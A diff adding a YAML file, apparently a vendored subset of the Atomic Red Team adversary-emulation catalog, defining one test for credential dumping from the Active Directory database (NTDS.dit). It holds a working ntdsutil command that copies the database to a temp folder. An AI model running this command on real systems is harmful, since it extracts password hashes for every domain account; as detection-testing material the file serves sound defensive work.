@@ -1,0 +1,20 @@
+# Vendored minimal subset of redcanaryco/atomic-red-team (MIT). Real upstream
+# commands; full catalog available via CSCTL_ATOMICS_PATH.
+attack_technique: T1003.003
+display_name: 'OS Credential Dumping: NTDS'
+atomic_tests:
+- name: Create Volume Shadow Copy with NTDS.dit via ntdsutil
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_folder:
+      description: Output folder for the IFM dump
+      type: path
+      default: 'C:\Windows\Temp\ntds_ifm'
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
+    cleanup_command: |
+      rmdir /s /q #{output_folder} >nul 2>&1
